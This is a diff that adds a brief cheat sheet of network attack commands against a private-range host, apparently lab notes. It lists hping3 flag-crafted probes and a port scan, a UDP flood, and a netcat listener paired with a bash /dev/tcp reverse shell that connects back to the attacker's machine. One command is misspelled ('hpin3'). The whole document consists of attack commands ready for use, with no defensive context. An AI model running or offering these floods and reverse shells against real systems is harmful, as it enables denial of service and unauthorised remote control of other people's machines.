@@ -1,0 +1,29 @@
+TCP SYN only
+hping3 -S -p 443 192.168.0.54
+
+TCP FIN only
+hping3 -F -p 443 192.168.0.54
+
+TCP PSH only
+hping3 -P -p 443 192.168.0.54
+
+TCP URG only
+hpin3 -U -p 443 192.168.0.54
+
+TCP RST only
+hping3 -R -p 443 192.168.0.54
+
+TCP XMAS
+hping -X -p 443 192.168.0.54
+
+TCP FIN scan
+hping3 -F -p 8000-9000 192.168.0.54
+
+UDP flood
+hping3 -2 --flood -p 443 192.168.0.54
+
+reverse shell attacker:
+ncat -l 8080
+
+reverse shell victim:
+/bin/bash -i >& /dev/tcp/192.168.0.53/8080 0>&1
